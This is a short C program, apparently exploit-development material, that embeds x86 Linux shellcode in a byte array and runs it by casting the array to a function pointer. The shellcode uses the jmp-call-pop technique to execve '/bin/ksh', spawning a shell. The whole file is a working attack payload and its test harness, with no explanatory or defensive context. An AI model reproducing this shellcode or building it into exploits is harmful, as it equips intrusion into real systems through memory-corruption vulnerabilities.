#include<stdio.h>
#include<string.h>

unsigned char shellcode[] =
"\xeb\x12\x31\xc0\x5e\x89\x46\x08\x89\xf3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6b\x73\x68";
main()
{
        printf("Shellcode Length: %d\n",strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
